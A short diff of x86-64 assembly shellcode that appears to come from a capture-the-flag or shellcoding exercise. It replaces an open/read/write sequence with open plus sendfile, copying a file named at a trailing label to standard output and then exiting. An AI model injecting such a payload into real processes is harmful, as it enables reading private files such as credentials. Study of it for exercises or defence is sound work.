@@ -12,23 +12,21 @@ main:
         xor rsi, rsi
         push 2
         pop rax
-        syscall
-        xchg rdi, rax
+        syscall                 # open
         xchg rsi, rax
-        push 1
-        pop rdx
-        shl rdx, 16
-        xor rax, rax
-        syscall
         xchg rdx, rax
         push 1
         pop rdi
-        shr rax, 16
-        syscall
+        push 1
+        pop r10
+        shl r10, 16
+        push 40
+        pop rax
+        syscall                 # sendfile
         xor rdi, rdi
         push 60
         pop rax
-        syscall
+        syscall                 # exit
 caller:
         call callee
 arg:
